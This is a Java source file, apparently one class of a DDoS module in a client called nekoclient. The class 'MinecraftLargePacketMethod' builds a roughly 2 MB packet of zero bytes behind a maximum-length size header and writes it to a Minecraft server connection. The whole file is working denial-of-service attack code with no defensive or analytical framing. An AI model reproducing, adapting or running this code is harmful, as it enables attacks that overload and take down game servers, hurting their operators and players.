package dev.neko.nekoclient.api.ddos.impl.handler.impl.minecraft;

import com.eclipsesource.json.JsonObject;
import dev.neko.nekoclient.api.ddos.Protocol;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.MinecraftMethodHandler;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.type.impl.VarIntType;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.Buffer;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Arrays;

public class MinecraftLargePacketMethod extends MinecraftMethodHandler {
   private ByteBuffer buffer;

   @Override
   public void init(Protocol protocol, InetSocketAddress address, String host, JsonObject options) throws IllegalArgumentException {
      VarIntType packetLength = new VarIntType(2097151);
      this.buffer = ByteBuffer.allocate(packetLength.size() + 2097151);
      packetLength.write(this.buffer);
      byte[] zeros = new byte[2097151];
      Arrays.fill(zeros, (byte)0);
      this.buffer.put(zeros);
      ((Buffer)this.buffer).flip();
   }

   @Override
   public void handle(SocketChannel channel) throws IOException {
      channel.write(this.buffer);
      channel.close();
   }
}
